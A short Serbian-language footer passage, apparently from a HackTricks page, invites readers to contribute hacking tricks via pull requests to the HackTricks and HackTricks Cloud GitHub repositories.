* **Podelite svoje hakovanje slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
